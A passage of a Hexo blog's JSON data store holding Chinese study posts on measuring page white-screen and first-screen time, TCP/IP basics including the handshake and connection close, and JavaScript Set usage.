class=\"headerlink\" title=\"如何计算\"></a>如何计算</h2><p>通常认为浏览器开始渲染 body 标签或者解析完 head 标签的时刻就是页面白屏结束的时间</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">\"en\"</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">  &lt;title&gt;白屏&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    // 不兼容performance.timing 的浏览器，如IE8</span></span><br><span class=\"line\"><span class=\"string\">    window.pageStartTime = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 页面 CSS 资源 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>common.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>page.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;script type=\"</span>text/javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    // 白屏时间\b结束点</span></span><br><span class=\"line\"><span class=\"string\">    window.firstPaint = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 页面内容 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果可以使用 performance api 的时候，白屏时间=firstPaint - performance.timing.navigationStart（浏览器打开网站开始）</li>\n<li>如果不可以使用，比如 ie8，那么白屏时间= firstPaint - pageStartTime</li>\n</ul>\n<h1 id=\"首屏时间\"><a href=\"#首屏时间\" class=\"headerlink\" title=\"首屏时间\"></a>首屏时间</h1><blockquote>\n<p>指用户打开网站开始，到浏览器首屏内容渲染完成的时间。一般来说，5s 内优秀，10 之内可以接受，10s 以上不可以接受</p>\n</blockquote>\n<h2 id=\"怎么计算\"><a href=\"#怎么计算\" class=\"headerlink\" title=\"怎么计算\"></a>怎么计算</h2><blockquote>\n<p>1.首屏模块标签标记法，2.统计首屏内加载最慢的图片的时间，3.自定义首屏内容计算法</p>\n</blockquote>\n<h3 id=\"首屏模块标签标记法\"><a href=\"#首屏模块标签标记法\" class=\"headerlink\" title=\"首屏模块标签标记法\"></a>首屏模块标签标记法</h3><ul>\n<li>适用于首屏内容不需要通过拉取数据才能生存以及页面不考虑图片等资源加载的情况。</li>\n<li>但是现在大多数情况都需要通过接口拉数据才能完整显示，所以这个不太使用</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">\"en\"</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">  &lt;title&gt;首屏&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    window.pageStartTime = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>common.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;link rel=\"</span>stylesheet<span class=\"string\">\" href=\"</span>page.css<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏可见模块1 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-1</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏可见模块2 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-2</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;script type=\"</span>text/javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    window.firstScreen = Date.now();</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 首屏不可见模块3 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-3</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;!-- 首屏不可见模块4 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=\"</span><span class=\"built_in\">module</span><span class=\"number\">-4</span><span class=\"string\">\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"统计首屏内图片完成加载的时间\"><a href=\"#统计首屏内图片完成加载的时间\" class=\"headerlink\" title=\"统计首屏内图片完成加载的时间\"></a>统计首屏内图片完成加载的时间</h3><ul>\n<li>通常首屏内容加载最慢的就是图片资源，因此我们会把首屏内加载最慢的图片的时间当作首屏时间</li>\n<li>遍历首屏内所有图片标签，并且监听所有图片标签的 onload 事件，最终遍历图片标签的加载时间的最大值，然后用这个最大值减去 navigationStart</li>\n</ul>\n<h3 id=\"自定义模块内容计算法\"><a href=\"#自定义模块内容计算法\" class=\"headerlink\" title=\"自定义模块内容计算法\"></a>自定义模块内容计算法</h3><ul>\n<li>由于统计图片加载时间比较复杂，通常会自定义模块内容，来简化</li>\n<li>忽略图片等资源加载情况，只考虑页面主要 dom</li>\n<li>只考虑首屏的主要模块，而不是严格意义首屏线上的所有内容</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"http://fex.baidu.com/blog/2014/05/build-performance-monitor-in-7-days/\" target=\"_blank\" rel=\"noopener\">7 天打造前端性能监控系统</a></li>\n</ul>\n"},{"title":"TCP/IP学习（一）","date":"2018-05-21T07:42:30.000Z","_content":"\n# TCP/IP 概念层模型\n\n> 对比的是 OSI 七层模型\n\n* 应用层（http）\n* 传输层（tcp）\n* 网络层（ip）\n* 链路层(以太网)\n\n# 数据包\n\n> 网络中传输的数据包由两部分组成，一个是协议所要用到的首部，另一部分是上一层传过来的数据。\n\n* 首部，明确标明了协议应该如何读取数据，就像协议的脸。\n\n# 传输层协议\n\n> 具有代表性的两个，分别是 tcp 和 udp\n\n## TCP\n\n* 面向连接的，可靠的协议。\n* 为提供可靠性传输，提供顺序控制和重发控制。\n\n## UDP\n\n* 不具有可靠性的数据报协议\n* 实时性要求高\n\n# 端口号\n\n> 一台计算机上可以同时运行多个程序。传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序。\n\n* 数据链路层，指的是 mac 地址，用于识别统一链路中不同的计算机。\n* 网络层，指的是 ip 地址，用于识别 tcp/ip 网络中互联的主机和路由器\n* 传输层，指的是端口号，用于识别同一计算机中进行通信的不同应用程序。被称为程序地址。\n\n## 端口号的确定\n\n### 标准既定的端口号\n\n* 每个应用程序都有其指定的端口号，但不是说随意使用任何一个端口号。例如 http，ftp 所使用的端口号就是固定的，这些叫知名端口号。\n* 知名端口号分布在 0-1023\n* 此外还有一些端口号被正式注册，他们分布在 1024-49151 之间，可用于任何通信用途\n\n### 时序分配法\n\n* 服务器有必要确定监听端口号，但是接受服务的客户端没必要确定端口号\n* 客户端应用程序全权交由操作系统设置\n\n# TCP 的三次握手\n\n> 建立连接\n\n* 第一次握手：客户端将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给服务器端，客户端进入 SYN_SENT 状态，等待服务器端确认。\n* 第二次握手：服务器端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务器端将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给客户端以确认连接请求，服务器端进入 SYN_RCVD 状态。\n* 第三次握手：客户端收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给服务器端，服务器端检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，客户端和服务器端进入 ESTABLISHED 状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。\n\n# TCP 的四次挥手\n\n> 中断连接端可以是客户端，也可以是服务器端。\n\n* 第一次挥手：客户端发送一个 FIN=M，用来关闭客户端到服务器端的数据传送，客户端进入 FIN_WAIT_1 状态。意思是说\"我客户端没有数据要发给你了\"，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。\n* 第二次挥手：服务器端收到 FIN 后，先发送 ack=M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入 FIN_WAIT_2 状态，继续等待服务器端的 FIN 报文。\n* 第三次挥手：当服务器端确定数据已发送完成，则向客户端发送 FIN=N 报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入 LAST_ACK 状态。\n* 第四次挥手：客户端收到 FIN=N 报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送 ack=N+1 后进入 TIME_WAIT 状态，如果 Server 端没有收到 ACK 则可以重传。服务器端收到 ACK 后，就知道可以断开连接了。客户端等待了 2MSL 后依然没有收到回复，则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。\n\n# 推荐阅读\n\n* [tcp/ip 协议篇二](https://juejin.im/post/5a069b6d51882509e5432656)\n","source":"_posts/study-tcpip-01.md","raw":"---\ntitle: TCP/IP学习（一）\ndate: 2018-05-21 15:42:30\ntags: 计算机网络\n---\n\n# TCP/IP 概念层模型\n\n> 对比的是 OSI 七层模型\n\n* 应用层（http）\n* 传输层（tcp）\n* 网络层（ip）\n* 链路层(以太网)\n\n# 数据包\n\n> 网络中传输的数据包由两部分组成，一个是协议所要用到的首部，另一部分是上一层传过来的数据。\n\n* 首部，明确标明了协议应该如何读取数据，就像协议的脸。\n\n# 传输层协议\n\n> 具有代表性的两个，分别是 tcp 和 udp\n\n## TCP\n\n* 面向连接的，可靠的协议。\n* 为提供可靠性传输，提供顺序控制和重发控制。\n\n## UDP\n\n* 不具有可靠性的数据报协议\n* 实时性要求高\n\n# 端口号\n\n> 一台计算机上可以同时运行多个程序。传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序。\n\n* 数据链路层，指的是 mac 地址，用于识别统一链路中不同的计算机。\n* 网络层，指的是 ip 地址，用于识别 tcp/ip 网络中互联的主机和路由器\n* 传输层，指的是端口号，用于识别同一计算机中进行通信的不同应用程序。被称为程序地址。\n\n## 端口号的确定\n\n### 标准既定的端口号\n\n* 每个应用程序都有其指定的端口号，但不是说随意使用任何一个端口号。例如 http，ftp 所使用的端口号就是固定的，这些叫知名端口号。\n* 知名端口号分布在 0-1023\n* 此外还有一些端口号被正式注册，他们分布在 1024-49151 之间，可用于任何通信用途\n\n### 时序分配法\n\n* 服务器有必要确定监听端口号，但是接受服务的客户端没必要确定端口号\n* 客户端应用程序全权交由操作系统设置\n\n# TCP 的三次握手\n\n> 建立连接\n\n* 第一次握手：客户端将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给服务器端，客户端进入 SYN_SENT 状态，等待服务器端确认。\n* 第二次握手：服务器端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务器端将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给客户端以确认连接请求，服务器端进入 SYN_RCVD 状态。\n* 第三次握手：客户端收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给服务器端，服务器端检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，客户端和服务器端进入 ESTABLISHED 状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。\n\n# TCP 的四次挥手\n\n> 中断连接端可以是客户端，也可以是服务器端。\n\n* 第一次挥手：客户端发送一个 FIN=M，用来关闭客户端到服务器端的数据传送，客户端进入 FIN_WAIT_1 状态。意思是说\"我客户端没有数据要发给你了\"，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。\n* 第二次挥手：服务器端收到 FIN 后，先发送 ack=M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入 FIN_WAIT_2 状态，继续等待服务器端的 FIN 报文。\n* 第三次挥手：当服务器端确定数据已发送完成，则向客户端发送 FIN=N 报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入 LAST_ACK 状态。\n* 第四次挥手：客户端收到 FIN=N 报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送 ack=N+1 后进入 TIME_WAIT 状态，如果 Server 端没有收到 ACK 则可以重传。服务器端收到 ACK 后，就知道可以断开连接了。客户端等待了 2MSL 后依然没有收到回复，则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。\n\n# 推荐阅读\n\n* [tcp/ip 协议篇二](https://juejin.im/post/5a069b6d51882509e5432656)\n","slug":"study-tcpip-01","published":1,"updated":"2018-05-21T13:00:01.842Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s200430ioferf2owh5","content":"<h1 id=\"TCP-IP-概念层模型\"><a href=\"#TCP-IP-概念层模型\" class=\"headerlink\" title=\"TCP/IP 概念层模型\"></a>TCP/IP 概念层模型</h1><blockquote>\n<p>对比的是 OSI 七层模型</p>\n</blockquote>\n<ul>\n<li>应用层（http）</li>\n<li>传输层（tcp）</li>\n<li>网络层（ip）</li>\n<li>链路层(以太网)</li>\n</ul>\n<h1 id=\"数据包\"><a href=\"#数据包\" class=\"headerlink\" title=\"数据包\"></a>数据包</h1><blockquote>\n<p>网络中传输的数据包由两部分组成，一个是协议所要用到的首部，另一部分是上一层传过来的数据。</p>\n</blockquote>\n<ul>\n<li>首部，明确标明了协议应该如何读取数据，就像协议的脸。</li>\n</ul>\n<h1 id=\"传输层协议\"><a href=\"#传输层协议\" class=\"headerlink\" title=\"传输层协议\"></a>传输层协议</h1><blockquote>\n<p>具有代表性的两个，分别是 tcp 和 udp</p>\n</blockquote>\n<h2 id=\"TCP\"><a href=\"#TCP\" class=\"headerlink\" title=\"TCP\"></a>TCP</h2><ul>\n<li>面向连接的，可靠的协议。</li>\n<li>为提供可靠性传输，提供顺序控制和重发控制。</li>\n</ul>\n<h2 id=\"UDP\"><a href=\"#UDP\" class=\"headerlink\" title=\"UDP\"></a>UDP</h2><ul>\n<li>不具有可靠性的数据报协议</li>\n<li>实时性要求高</li>\n</ul>\n<h1 id=\"端口号\"><a href=\"#端口号\" class=\"headerlink\" title=\"端口号\"></a>端口号</h1><blockquote>\n<p>一台计算机上可以同时运行多个程序。传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序。</p>\n</blockquote>\n<ul>\n<li>数据链路层，指的是 mac 地址，用于识别统一链路中不同的计算机。</li>\n<li>网络层，指的是 ip 地址，用于识别 tcp/ip 网络中互联的主机和路由器</li>\n<li>传输层，指的是端口号，用于识别同一计算机中进行通信的不同应用程序。被称为程序地址。</li>\n</ul>\n<h2 id=\"端口号的确定\"><a href=\"#端口号的确定\" class=\"headerlink\" title=\"端口号的确定\"></a>端口号的确定</h2><h3 id=\"标准既定的端口号\"><a href=\"#标准既定的端口号\" class=\"headerlink\" title=\"标准既定的端口号\"></a>标准既定的端口号</h3><ul>\n<li>每个应用程序都有其指定的端口号，但不是说随意使用任何一个端口号。例如 http，ftp 所使用的端口号就是固定的，这些叫知名端口号。</li>\n<li>知名端口号分布在 0-1023</li>\n<li>此外还有一些端口号被正式注册，他们分布在 1024-49151 之间，可用于任何通信用途</li>\n</ul>\n<h3 id=\"时序分配法\"><a href=\"#时序分配法\" class=\"headerlink\" title=\"时序分配法\"></a>时序分配法</h3><ul>\n<li>服务器有必要确定监听端口号，但是接受服务的客户端没必要确定端口号</li>\n<li>客户端应用程序全权交由操作系统设置</li>\n</ul>\n<h1 id=\"TCP-的三次握手\"><a href=\"#TCP-的三次握手\" class=\"headerlink\" title=\"TCP 的三次握手\"></a>TCP 的三次握手</h1><blockquote>\n<p>建立连接</p>\n</blockquote>\n<ul>\n<li>第一次握手：客户端将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给服务器端，客户端进入 SYN_SENT 状态，等待服务器端确认。</li>\n<li>第二次握手：服务器端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务器端将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给客户端以确认连接请求，服务器端进入 SYN_RCVD 状态。</li>\n<li>第三次握手：客户端收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给服务器端，服务器端检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，客户端和服务器端进入 ESTABLISHED 状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。</li>\n</ul>\n<h1 id=\"TCP-的四次挥手\"><a href=\"#TCP-的四次挥手\" class=\"headerlink\" title=\"TCP 的四次挥手\"></a>TCP 的四次挥手</h1><blockquote>\n<p>中断连接端可以是客户端，也可以是服务器端。</p>\n</blockquote>\n<ul>\n<li>第一次挥手：客户端发送一个 FIN=M，用来关闭客户端到服务器端的数据传送，客户端进入 FIN_WAIT_1 状态。意思是说”我客户端没有数据要发给你了”，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。</li>\n<li>第二次挥手：服务器端收到 FIN 后，先发送 ack=M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入 FIN_WAIT_2 状态，继续等待服务器端的 FIN 报文。</li>\n<li>第三次挥手：当服务器端确定数据已发送完成，则向客户端发送 FIN=N 报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入 LAST_ACK 状态。</li>\n<li>第四次挥手：客户端收到 FIN=N 报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送 ack=N+1 后进入 TIME_WAIT 状态，如果 Server 端没有收到 ACK 则可以重传。服务器端收到 ACK 后，就知道可以断开连接了。客户端等待了 2MSL 后依然没有收到回复，则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://juejin.im/post/5a069b6d51882509e5432656\" target=\"_blank\" rel=\"noopener\">tcp/ip 协议篇二</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"TCP-IP-概念层模型\"><a href=\"#TCP-IP-概念层模型\" class=\"headerlink\" title=\"TCP/IP 概念层模型\"></a>TCP/IP 概念层模型</h1><blockquote>\n<p>对比的是 OSI 七层模型</p>\n</blockquote>\n<ul>\n<li>应用层（http）</li>\n<li>传输层（tcp）</li>\n<li>网络层（ip）</li>\n<li>链路层(以太网)</li>\n</ul>\n<h1 id=\"数据包\"><a href=\"#数据包\" class=\"headerlink\" title=\"数据包\"></a>数据包</h1><blockquote>\n<p>网络中传输的数据包由两部分组成，一个是协议所要用到的首部，另一部分是上一层传过来的数据。</p>\n</blockquote>\n<ul>\n<li>首部，明确标明了协议应该如何读取数据，就像协议的脸。</li>\n</ul>\n<h1 id=\"传输层协议\"><a href=\"#传输层协议\" class=\"headerlink\" title=\"传输层协议\"></a>传输层协议</h1><blockquote>\n<p>具有代表性的两个，分别是 tcp 和 udp</p>\n</blockquote>\n<h2 id=\"TCP\"><a href=\"#TCP\" class=\"headerlink\" title=\"TCP\"></a>TCP</h2><ul>\n<li>面向连接的，可靠的协议。</li>\n<li>为提供可靠性传输，提供顺序控制和重发控制。</li>\n</ul>\n<h2 id=\"UDP\"><a href=\"#UDP\" class=\"headerlink\" title=\"UDP\"></a>UDP</h2><ul>\n<li>不具有可靠性的数据报协议</li>\n<li>实时性要求高</li>\n</ul>\n<h1 id=\"端口号\"><a href=\"#端口号\" class=\"headerlink\" title=\"端口号\"></a>端口号</h1><blockquote>\n<p>一台计算机上可以同时运行多个程序。传输层协议正是利用这些端口号识别本机中正在进行通信的应用程序。</p>\n</blockquote>\n<ul>\n<li>数据链路层，指的是 mac 地址，用于识别统一链路中不同的计算机。</li>\n<li>网络层，指的是 ip 地址，用于识别 tcp/ip 网络中互联的主机和路由器</li>\n<li>传输层，指的是端口号，用于识别同一计算机中进行通信的不同应用程序。被称为程序地址。</li>\n</ul>\n<h2 id=\"端口号的确定\"><a href=\"#端口号的确定\" class=\"headerlink\" title=\"端口号的确定\"></a>端口号的确定</h2><h3 id=\"标准既定的端口号\"><a href=\"#标准既定的端口号\" class=\"headerlink\" title=\"标准既定的端口号\"></a>标准既定的端口号</h3><ul>\n<li>每个应用程序都有其指定的端口号，但不是说随意使用任何一个端口号。例如 http，ftp 所使用的端口号就是固定的，这些叫知名端口号。</li>\n<li>知名端口号分布在 0-1023</li>\n<li>此外还有一些端口号被正式注册，他们分布在 1024-49151 之间，可用于任何通信用途</li>\n</ul>\n<h3 id=\"时序分配法\"><a href=\"#时序分配法\" class=\"headerlink\" title=\"时序分配法\"></a>时序分配法</h3><ul>\n<li>服务器有必要确定监听端口号，但是接受服务的客户端没必要确定端口号</li>\n<li>客户端应用程序全权交由操作系统设置</li>\n</ul>\n<h1 id=\"TCP-的三次握手\"><a href=\"#TCP-的三次握手\" class=\"headerlink\" title=\"TCP 的三次握手\"></a>TCP 的三次握手</h1><blockquote>\n<p>建立连接</p>\n</blockquote>\n<ul>\n<li>第一次握手：客户端将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给服务器端，客户端进入 SYN_SENT 状态，等待服务器端确认。</li>\n<li>第二次握手：服务器端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务器端将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给客户端以确认连接请求，服务器端进入 SYN_RCVD 状态。</li>\n<li>第三次握手：客户端收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给服务器端，服务器端检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，客户端和服务器端进入 ESTABLISHED 状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。</li>\n</ul>\n<h1 id=\"TCP-的四次挥手\"><a href=\"#TCP-的四次挥手\" class=\"headerlink\" title=\"TCP 的四次挥手\"></a>TCP 的四次挥手</h1><blockquote>\n<p>中断连接端可以是客户端，也可以是服务器端。</p>\n</blockquote>\n<ul>\n<li>第一次挥手：客户端发送一个 FIN=M，用来关闭客户端到服务器端的数据传送，客户端进入 FIN_WAIT_1 状态。意思是说”我客户端没有数据要发给你了”，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。</li>\n<li>第二次挥手：服务器端收到 FIN 后，先发送 ack=M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入 FIN_WAIT_2 状态，继续等待服务器端的 FIN 报文。</li>\n<li>第三次挥手：当服务器端确定数据已发送完成，则向客户端发送 FIN=N 报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入 LAST_ACK 状态。</li>\n<li>第四次挥手：客户端收到 FIN=N 报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送 ack=N+1 后进入 TIME_WAIT 状态，如果 Server 端没有收到 ACK 则可以重传。服务器端收到 ACK 后，就知道可以断开连接了。客户端等待了 2MSL 后依然没有收到回复，则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://juejin.im/post/5a069b6d51882509e5432656\" target=\"_blank\" rel=\"noopener\">tcp/ip 协议篇二</a></li>\n</ul>\n"},{"title":"使用set数据结构","date":"2018-04-22T06:19:12.000Z","_content":"\n## 使用 set 数据结构\n\n> set 是一个类似数组的数据结构，但是它没有重复值\n\n### 如何生成 set 数据结构\n\n* 直接 new Set()\n* 往 new Set()传入具有 iterator 接口的数据结构，比如数组\n\n```javascript\n// 例一\nconst set = new Set([1, 2, 3, 4, 4]);\n[...set];\n// [1, 2, 3, 4]\n\n// 例二\nconst items = new Set([1, 2, 3, 4, 5, 5, 5, 5]);\nitems.size; // 5\n\n// 例三\nconst set = new Set(document.querySelectorAll(\"div\"));\nset.size; // 56\n\n// 类似于\nconst set = new Set();\ndocument.querySelectorAll(\"div\").forEach(div => set.add(div));\nset.size; // 56\n```\n\n### set 实例属性和方法\n\n#### 属性\n\n* Set.prototype.constructor：构造函数，默认就是 Set 函数\n* Set.prototype.size：返回实例的总数\n\n#### 方法\n\n##### 操作方法\n\n* add(val)：添加某个值，返回 该实例\n* delete(val):删除某个值，返回布尔值，表示是否成功\n* has(val)：返回布尔值，表示是否拥有\n* clear()：清空所有，返回值 void\n\n##### 遍历方法\n\n> set 结构是具有 itrator 接口的，可以直接 for..of 遍历，相当于下面的 values\n\n* keys：返回键名的遍历器对象\n* values：返回值的遍历器对象\n* entries:返回键值对的遍历器对象\n* forEach:使用回调函数遍历每个成员\n\n> 由于 set 没有键名，只有键值，或者说键名和键值一样，所以 keys===values\n\n### 应用\n\n> 扩展运算符（...）内部使用 for..of，所以也可以应用在 set 结构。同时数组的 map 和 filter 方法也可以应用于 set。\n\n```javascript\nlet arr = [3, 5, 2, 2, 5, 5];\nlet unique = [...new Set(arr)];\n// [3, 5, 2]\nlet set = new Set([1, 2, 3]);\nset = new Set([...set].map(x => x * 2));\n// 返回Set结构：{2, 4, 6}\n\nlet set = new Set([1, 2, 3, 4, 5]);\nset = new Set([...set].filter(x => x % 2 == 0));\n// 返回Set结构：{2, 4}\n```\n\n* set 结构很容易实现交集，并集，差集\n\n```javascript\nlet a = new Set([1, 2, 3]);\nlet b = new Set([4, 3, 2]);\n\n// 并集\nlet union = new Set([...a, ...b]);\n// Set {1, 2, 3, 4}\n\n// 交集\nlet intersect = new Set([...a].filter(x => b.has(x)));\n// set {2, 3}\n\n// 差集\nlet difference = new Set([...a].filter(x => !b.has(x)));\n// Set {1}\n```\n","source":"_posts/study-set.md","raw":"---\ntitle: 使用set数据结构\ndate: 2018-04-22 14:19:12\ntags: javascript\n---\n\n## 使用 set 数据结构\n\n> set 是一个类似数组的数据结构，但是它没有重复值\n\n### 如何生成 set 数据结构\n\n* 直接 new Set()\n* 往 new Set()传入具有 iterator 接口的数据结构，比如数组\n\n```javascript\n// 例一\nconst set = new Set([1, 2, 3, 4, 4]);\n[...set];\n// [1, 2, 3, 4]\n\n// 例二\nconst items = new Set([1, 2, 3, 4, 5, 5, 5, 5]);\nitems.size; // 5\n\n// 例三\nconst set = new Set(document.querySelectorAll(\"div\"));\nset.size; // 56\n\n// 类似于\nconst set = new Set();\ndocument.querySelectorAll(\"div\").forEach(div => set.add(div));\nset.size; // 